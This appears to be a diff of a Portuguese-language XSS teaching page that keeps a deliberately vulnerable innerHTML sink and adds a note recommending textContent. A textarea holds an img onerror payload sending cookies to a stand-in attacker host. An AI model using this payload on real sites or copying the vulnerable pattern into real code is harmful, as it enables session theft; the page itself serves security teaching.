@@ -3,8 +3,12 @@
 <head>
   <meta charset="UTF-8">
   <title>Title</title>
+  <style>
+    .code {
+      color: red;
+    }
+  </style>
 </head>
-<!-- TODO: NAO UTILIZAR DOCUMENT ELEMENT BY ID -->
 <body>
   <h1>Exemplo de Cross Site Scripting</h1>
   <p>
@@ -26,23 +30,32 @@
   <p>
     <textarea readonly onclick=this.select()><img src=x onerror="document.location='https://sitedoatacante.com?coockies=document.coockie'"></textarea>
   </p>
-
-  <script>
-  var cookies = 'secretCookie=but not HttpOnly!';
-
-  window.onload = function createEventToOnClick(){
-    var button = document.querySelector('button.action');
-    button.addEventListener('click',save);
-  }
-
-  function save(){
-    var name = document.getElementById('nameInput').value;
-    document.getElementById('nameDisplay').innerHTML = name;
-  }
-  </script>
-
-  <p>para saber mais e como se prevenir, acesse:
+  <p>solução: 
+    <br>desse ataque em específico, podemos nos prevenir 
+    <br>utilizando <label class="code">.textContent</label> invés de <label class="code">.innerHTML</label> (linha 56)
+    <br>para saber mais e outras formas de prevenção, acesse:
     <br><a href="https://github.com/DeveloperArthur/owasp-top-10#a7---cross-site-scripting-xss">
       https://github.com/DeveloperArthur/owasp-top-10#a7---cross-site-scripting-xss</a></p>
+
+  <script>
+    var cookies = 'secretCookie=but not HttpOnly!';
+  
+    window.onload = function createEventToOnClick(){
+      var button = document.querySelector('button.action');
+      button.addEventListener('click', buildName());
+    }
+  
+    function buildName(){
+      //esta função é executada apenas quando a página é carregada
+      var nameInputElement = document.getElementById('nameInput');
+      var nameDisplayElement = document.getElementById('nameDisplay');
+
+      return function(){
+        //esta função é executada no evento de click
+        var name = nameInputElement.value;
+        nameDisplayElement.innerHTML = name; //<- PROBLEMA
+      }
+    }
+  </script>
 </body>
 </html>
